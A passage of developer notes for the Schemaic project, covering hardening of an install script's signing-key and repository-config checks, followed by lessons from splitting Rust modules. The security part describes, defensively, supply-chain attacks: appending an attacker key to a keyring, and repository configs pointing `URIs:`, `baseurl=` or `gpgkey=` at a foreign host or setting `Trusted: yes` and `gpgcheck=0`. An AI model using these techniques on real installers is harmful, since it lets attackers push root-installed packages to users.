  exist. The keyring path `Signed-By` names has **five** copies — `install.sh`, `build-site.sh`
  twice (the deb822 source and the one-line one), `index.html.in` and `verify-site.py` — of which it
  compared none; the pair inside `build-site.sh` is checked by *count* rather than by presence,
  since one of the two writing a different path is exactly the drift that matters and a presence
  test would pass on it. `Origin` and `Suite` are read out of `build-apt-repo.sh`
  (`ORIGIN="Schemaic"`, `SUITE="stable"`) and out of `packaging/repo/README.md`, which is the prose
  telling users to pin `"Schemaic:stable"`. **`Components` and `Architectures` are the same class of
  value one field further down the deb822 stanza**, and they had no guard at all: the index is laid
  out under `dists/stable/<component>/binary-<arch>/`, so one side moving alone publishes an index at
  a path the source lists do not ask for and `apt update` 404s on every machine that already has one.
  Three places, deliberately — the stanza the user installs (`build-site.sh`), the builder that lays
  the index out (`build-apt-repo.sh`'s `COMPONENT`/`ARCH`), and the checker that fetches it
  (`verify-site.py`, which hard-codes `main/binary-amd64` and so would otherwise notice a mismatch
  only as a missing file, and only if the *other* side moved).
  **The published key fingerprint is the last of these values, and the one the packaging README
  designates *the* independent channel** — "a fingerprint you can only check against the same server
  the key came from is not a check at all, and this repository's history is a channel that server
  does not control." It was the one nobody compared. `Check the published key fingerprint agrees
  with the README` runs **after** the build rather than beside the step above, because the built
  value is what there is to compare against: it lifts the 40-hex string out of the generated
  `site/index.html` — derived from the key that actually signed this build — and requires
  `README.md` to carry it verbatim. A rotation moves the site's copy and leaves `README.md`
  asserting the old one, which is worse than publishing no fingerprint at all, because someone will
  check against it.
  **`install.sh`'s end of that check could be defeated twice without replacing the key.** An OpenPGP
  keyring is a packet stream, so `cat real.gpg attacker.gpg` is a valid keyring every tool unpacks,
  and `key_fingerprint` reads only the *first* key in it — both of its paths, `gpg`'s awk with its
  `exit` and the hand parser that hashes packet 0. Both answered with the genuine fingerprint,
  "Signing key verified" was printed, and then the **whole file** was installed: apt trusts every key
  in a `Signed-By` keyring, and `rpm --import` puts every block into the machine's *global* keyring,
  where it validates packages from any repository, permanently — and not one of the three rpm
  uninstall lines removed it, so somebody following them to the letter was left trusting a signing
  key for software they had just removed. The debian route's line already removes `${KEYRING}`, a
  file this script installed and nothing else uses; the rpm route has no such file, and its
  instructions now end in `sudo rpm -e --allmatches gpg-pubkey-<id>`, the id derived from
  `KEY_FINGERPRINT` (its last eight hex digits, lower-cased) rather than written out, so the two
  cannot drift from the value CI already pins. Not on the `SCHEMAIC_NO_REPO` branch, which installs
  through `rpm -i --nosignature` and never imports a key: a line that fails, on the branch where the
  user is least able to tell whether that mattered. `only_one_key` refuses a file holding more than
  one public key — `gpg`
  counts `^pub:` where it is present, and a new `count_public_key_packets` walks the packet stream
  where it is not, so the deb route's promise that a slim container needs no `gpg` still holds; a
  stream that does not walk cleanly to its end is a failure rather than a count, the whole point
  being that the bytes about to be installed are the bytes that were verified. Demonstrated in WSL
  with two real generated keys, with and without `gpg` on `PATH`.
  **The second was that nothing checked the two repository configurations, which decide what the key
  is *used for*.** They come from the same origin as the key and were accepted on one shape grep
  each, so serving the genuine key alongside a config naming a foreign `URIs:`/`baseurl=` got
  *"Repository added, signed by the published key"* printed and every later `apt-get upgrade` /
  `dnf upgrade` fetching root-installed packages from the attacker's host for the life of the
  install — and on the rpm side `dnf install -y` imports whatever `gpgkey=` names with no prompt,
  which defeats the key check rather than weakening it. `require_expected_line` compares `URIs:`,
  `Signed-By:`, `baseurl=`, `gpgkey=`, `gpgcheck=1` and `repo_gpgcheck=1` against the `SITE` and
  `KEYRING` constants the script already held and never consulted, and any `Trusted:` field is
  refused outright, deb822's `Trusted: yes` turning apt's signature verification off for the entry
  entirely. It is this same rule a third time: a value written into a user's source list is identity,
  and a check on its *shape* is not a check on its *identity*. Demonstrated in WSL against a local
  mirror of the *genuine* published site — the real `schemaic-archive-keyring.gpg` and `schemaic.asc`
  fetched from `https://fadion.github.io/schemaic`, served over HTTP, with only the repository
  configuration altered and only `SITE` changed in the script, which is the staging shape the
  composed-keyring demonstration used. Six attacks, six refusals, and nothing installed in any of
  them — no source or repo file, no keyring, no rpm-database key, no binary — each one preceded by
  `[+] Signing key verified: ABDBDC3958F3FAFC734273796566ECED7795DC1A`, which is the finding's whole
  point: the key check passes and the configuration decides what the key is used for. On `debian:12`,
  a foreign `URIs:`, a `Trusted: yes` field, and an inline armoured key in `Signed-By:` — the deb822
  form that carries the attacker's key in the file nothing checked; on `fedora:41`, a foreign
  `baseurl=`, `gpgcheck=0`, and a foreign `gpgkey=`. Each refusal names the line it expected
  (`expected a line: URIs: http://…/deb`, `expected a line: gpgkey=http://…/schemaic.asc`) except
  `Trusted:`, whose separate branch says *"the downloaded apt source asks apt to trust it without a
  signature."* The controls are half the demonstration: a well-formed configuration naming the mirror
  passes on both families and proceeds — *"Repository added, signed by the published key"* on deb,
  *"Repository added, with signature checking on"* on rpm — each then failing only at `apt-get
  update` / `dnf install`, because the mirror carries no actual package repository.
- **Splitting `lib.rs` / `main.rs`:** grep the line range for interleaved unrelated `fn`s first; a
  helper still used by code that stays goes to `widgets.rs` (glob-imported), not the new leaf
  module; mark cross-called items `pub(crate)`; build + `cargo fmt` + smoke-launch each step.
  **Cut where an invariant is, not where the line count is.** `modals.rs` is the worked example:
  the modal layer was not the largest thing in `lib.rs`, it was the thing whose *tuple order was
  policy* and whose gate could then sit beside what it guards. Two things make such a cut checkable
  in a diff nobody can read line by line — and this is a move whose whole risk is that. First,
  **strip comments and blank lines from both sides and diff the code**; a move that is right shows
  only the new scaffolding (imports, the signature, the bindings) and the handful of edits you
  meant. Second, **prove the moved tests still bite in their new home**: a source-scanning gate that
  reads a file by name passes vacuously the moment the name is wrong, so break a term, watch it
  fail, and put it back. Both were done for this cut, and the second is the one that would have
  caught a gate left pointing at `lib.rs`.
  **`schemaic-db`'s MySQL extraction is the second worked example, and it adds two things.** Move
  an *item list*, never a line range: one of its six steps took a range and swept three unrelated
  public `impl Db` methods across with it, which compiled — an inherent `impl` is legal in any
  module of the crate — with the moved lines byte-for-byte what left, so the diff read clean and
  the placement was wrong. What said so was a census naming every entry point
  (`the_dispatcher_calls_every_engine_module_for_every_entry_point`), which is the check byte
  identity cannot be. And a gate that lands in the **same file as its subject becomes its own first
  match**, since a literal `find("async fn import_on(")` finds the test's own line before the
  function: assemble the needle from fragments, prefer reading the directory to naming a file, and
  give every source gate a floor so a scan that finds nothing fails rather than passes.
  **`app/history_store.rs` is the third, and it is *a gate left pointing at the old file* from the
  other side**: the gate that broke was not one that moved but one that stayed — `main.rs`'s census
  of erasing saves in the connection-delete closure, which read eight against its floor of nine
  because the store it was counting had left the file. A floor invites the repair of lowering it, and that is the wrong one,
  since the floor is what stops a *different* store's erase going missing. The right one is to count
  the **delegated** call the closure still makes and gate the erase itself in the module it moved
  to, so a store cannot be lost by being moved out.
  **`app/snippet_store.rs` is the fourth, and its lesson is where the line fell**: the seam was the
  store against the editor and the modal rather than anything by feature area, so four of the
  closures it touched came apart in half — the tab read or the confirm staying in `app_view`, the
  write and its save moving — rather than moving whole.
  **`app/ui_stores.rs` is the fifth, and its lesson is that not every candidate is the same shape —
  the tell is where the mutators live.** It looks like the third and fourth (another set of small
  persisted stores lifted out of `app_view`) and is not one: every mutation of those three stores is
  in `schemaic-ui`, so what came out could own the file names and one `saver` but *not* the
  invariant, and it had to be held in the view crate instead — first by a source gate
  (`persisted_store_gate`, under `source_gate.rs`), and later by a type, `ui/stored.rs`'s `Stored`,
  which the module now hands out in place of the raw signals. Read the call sites before assuming
  a cut takes
  its invariant with it, and where it doesn't, say so in the module that doesn't have it — the risk
  is a module that reads as its siblings' peer and guarantees less than a reader will assume.
  **`ui_state` is the sixth, and it is the one that did not move: some candidates are not liftable,
  and saying so is the outcome.** It was next on the list after the three store cuts above and is
  not store-shaped at all — the tell is a value assembled from dozens of *unrelated* signals.
  `save_ui` reads some thirty of them (theme, scale, fonts, the AI settings, panel geometry, the row
  limit, the statement timeout, the schema filter) into a `UiState` of a few more fields, and each
  is also read by some other part of `app_view` that has nothing to do with the save. A module for
  it takes either a thirty-parameter function or a struct holding all of them — which is `UiState` again, one
  level removed, with a second place to forget a field. What was worth taking out was the duplicated
  *decision* inside it rather than the state: `persist::migrate_legacy_once`, the legacy-list
  bargain `main.rs` had written out twice. Record the refusal where the next session will look for
  it, or the step gets attempted again. (The gathering has since come out of `save_ui` into a
  `current_ui_state` closure beside it, because the settings export needs the same `UiState` —
  it is still in `main.rs`, reading the same signals.)
  **`diagrams` is the seventh, and it is the sixth's near miss: nothing to lift, and worth the visit
  anyway.** Like `ui_state` it moved no code — the ER layout file is loaded and saved entirely in
  `schemaic-ui`'s `erd_view.rs`, and the app side is the layout prune inside `delete_conn_now` —
  but unlike `ui_state`, where the answer was simply *no*, it had something else to hand back: a rule
  stated three times in three comments and held by a gate whose own doc admitted it could only count
  (`core/persist.rs`'s lazy-load reporting contract). Reading a candidate for the cut is also reading
  it for that, so when the answer to "what moves?" is *nothing*, ask what the duplication was
  standing in for before closing the file — here it was one reporting door
  (`schemaic_ui::load_diagram_layouts`) and a gate that can now name its offender.
  **The run paths are the eighth, and they are the sixth's answer for a different reason: there is
  nothing left to push down.** They stood in `TODO.md` as one of two unsurveyed candidates; they are
  surveyed now and the answer is no. Roughly 900 lines across three non-contiguous regions of
  `main.rs` — `run_query_core`, `run`, `apply_view`, `run_all` and `cancel` in one, `guard_policy`,
  `run_guard`, `run_moved_on`, `gated_run`/`gated_run_all`, `guarded_run`/`guarded_run_all` and
  `run_anyway` in another — but every decision behind those closures is *already* a tested pure
  function or a `schemaic-core` type: `GuardPolicy::of` and `sql::run_verdict`,
  `params::prepare_run`, and the module-scope free functions `health_check_lets_through`,
  `check_outcome`, `run_result` and `plan_refusal_text`. The guard block is a thin `match` over
  `RunVerdict`, and its own comment says it — *"This closure gathers signals; it does not decide."*
  What is left is orchestration to relocate, not a decision to lift. It also reads `active`, `tabs`,
  `connections`/`active_conn`, `row_limit`, `statement_timeout`, `confirm_writes` and the shared
  `db_for`/`session_for` closures, each with 40+ other call sites across `app_view`, which is the
  `ui_state` shape again: a module that takes a giant parameter list or re-invents the struct.
  **The third reason is the one to state most plainly**: the invariant genuinely worth protecting
  here is already owned, by a source-scanning test *inside* `main.rs` —
  `the_unguarded_run_has_only_its_two_stated_callers` reads `main.rs`'s own text and asserts the
  exact list of raw `run(...)` call sites. Moving `run`/`run_query_core`/`run_all` out would
  silently zero that gate's count unless the test moved with them and was rewritten to read the new
  file, which is precisely the *gate left pointing at the old file* failure the third entry above
  already records — and the subject here is the **write-guard invariant**, the one whose whole
  history is a `return` going missing.
  **The connection lifecycle is the ninth, and its no is the stronger of the two.** The body is
  `persist_conns`, `toggle_read_only`, `use_conn`, `switch_conn`, `select_conn`/`new_conn`/
  `duplicate_conn`/`test_conn`, `save_conn`, `delete_conn_now` and `delete_conn`, and it is neither
  store-shaped nor decision-shaped. `delete_conn_now` is the app's one *coordinator* over every
  persisted store: by direct write or by a per-store `clear_conn`/save it touches on the order of
  two dozen signals — `tabs`, `tokens`, `tunnels`, `recently_closed`, `last_tab`, the four AI
  signals, `saved_chats`, `connections`, `active_conn`, `draft`, `conn_status`, `health_failures`,
  `search_history`, `db_colors`, `table_colors`, `db_favorites`, `activity_intervals`,
  `hidden_db_rules`, `expanded_rules`, `formats` — plus the already-delegated `history.clear_conn`
  and `snippet_store.clear_conn` and a dozen already-built closures. That is a *worse* instance of
  the shape that stopped `ui_state`: not twenty-nine signals feeding one struct but around
  twenty-five signals and a dozen closures captured by one body, and its breadth is the feature
  rather than an accident — it is why the delete can erase every store in the right order. A
  **partial** cut is worse again, because it splits the body's load-bearing invariant across two
  files: `the_active_connection_is_moved_in_exactly_one_place` asserts exactly one `active_conn.set(`
  in the whole file, in `use_conn`, and that `use_conn` has at least three callers — and those
  callers are `switch_conn` plus *two sites inside `delete_conn_now`*. So "take switch, select, new,
  duplicate and test, leave delete and save" is exactly the comes-apart-in-half failure the fourth
  entry above records. And the eighth's file-anchored-gate problem applies here on **two**
  invariants at once: `deleting_a_connection_erases_every_store_it_was_keyed_into` locates
  `delete_conn_now`'s literal text in `main.rs`, and the `use_conn` gate reads
  `include_str!("main.rs")`.
  **The two are not cleanly separable from each other, either.** The connection-health gate
  `check_conn`/`check_conn_then`/`with_conn`/`with_conn_else` sits under both the run guard and
  `ConnActions::recheck_conn`, and is used directly by `commit_edits`, `add_tab`, `ai_send` and
  `run_plan` — none of which belong to either candidate — so any cut touching it would have to leave
  it behind or lift it to a third module neither body owns.
  **With those two refused, the `app_view` splitting campaign is finished.** The store-shaped seam
  was the whole of it; what remains is orchestration over widely-shared signals, guarded by gates
  anchored to `main.rs`'s own source text. Read this as *surveyed, refused, here is why* rather than
  as a list nobody has got to yet.
